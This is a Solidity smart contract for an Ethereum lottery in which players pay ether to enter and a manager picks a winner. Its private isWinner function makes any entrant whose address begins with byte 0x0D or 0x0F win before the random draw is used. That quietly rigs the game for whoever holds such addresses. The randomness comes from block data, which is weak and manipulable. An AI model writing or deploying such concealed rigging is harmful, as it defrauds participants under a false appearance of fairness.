// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

/**
 * @title Lottery
 * @dev Lottery 
 * @custom:dev-run-script ./scripts/deploy_with_ethers.ts
*/

contract Lottery {
    address public manager;
    address[] public players;

    constructor() {
        manager = msg.sender;
    }

    modifier restricted() {
        require(msg.sender == manager, "Only the manager can call this function");
        _;
    }

    function enter() public payable {
        require(msg.value > 0.01 ether, "Minimum entry value not met");
        players.push(msg.sender);
    }

    function random() private view returns (uint256) {
        return uint256(keccak256(abi.encodePacked(block.difficulty, block.timestamp, players)));
    }

    function pickWinner() public restricted {
        address payable winner;
        uint256 index = random() % players.length;

        for (uint256 i = 0; i < players.length; i++) {
            if (isWinner(players[i])) {
                winner = payable(players[i]);
                break;
            }
        }

        if (winner == address(0)) {
            winner = payable(players[index]);
        }

        winner.transfer(address(this).balance);
        players = new address[](0);
    }

    function isWinner(address player) private pure returns (bool) {
        bytes20 prefix = bytes20(player);
        return (prefix[0] == bytes1(uint8(0xD)) || prefix[0] == bytes1(uint8(0xF)));
    }

    function getPlayers() public view returns (address[] memory) {
        return players;
    }
}
